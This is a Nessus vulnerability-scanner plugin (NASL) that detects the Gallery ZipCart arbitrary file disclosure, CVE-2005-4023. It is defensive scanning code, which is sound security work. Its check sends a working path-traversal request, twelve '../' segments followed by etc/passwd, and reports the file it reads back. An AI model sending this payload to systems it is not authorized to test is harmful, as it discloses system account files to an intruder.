#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21018);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_cve_id("CVE-2005-4023");
  script_bugtraq_id(15614);
  script_osvdb_id(21312);

  script_name(english:"Gallery Zipcart Module Arbitrary File Disclosure");
  script_summary(english:"Tries to retrieve a file using Gallery's ZipCart module");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that has an
information disclosure issue."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The installation of Gallery hosted on the remote web server allows an
unauthenticated, remote attacker to use the ZipCart module to retrieve
arbitrary files, subject to the privileges of the web server user id. 

Note that successful exploitation requires that the ZipCart module is
installed and activated on the Gallery install. 

Note that the application is also reportedly affected by a cross-site
scripting vulnerability in the 'Add Image From Web' feature as well as
an information disclosure with the install log; however, Nessus has not
tested for these additional issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Nov/366");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/418200/100/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://galleryproject.org/gallery_2.0.2_released");
  script_set_attribute(
    attribute:"solution",
    value:
"Deactivate the ZipCart module or upgrade to Gallery version 2.0.2 or
later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/11/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/03/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gallery_project:gallery");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/gallery", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "gallery",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];

file =  mult_str(str:"../", nb:12) + "etc/passwd";
w = http_send_recv3(
  method :"GET",
  item   : dir + "/main.php?g2_view=zipcart.Download&g2_file=" + file,
  port   : port,
  exit_on_fail : TRUE
);
res = strcat(w[0], w[1], '\r_n', w[2]);

# There's a problem if...
if (
  # it looks like ZipCart and...
  'filename="G2cart.zip"' >< res &&
  # there's an entry for root.
  egrep(pattern:"root:.*:0:[01]:", string:res)
)
{
  content = strstr(res, "Content-Type: application/zip");
  if (content) content = content - "Content-Type: application/zip";
  else content = res;

  if (report_verbosity > 0)
  {
    report = "\n" +
      "Here are the contents of the file '/etc/passwd' that\n" +
      "Nessus was able to read from the remote host :\n" +
      "\n" + content;
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Gallery", build_url(qs:dir, port:port));
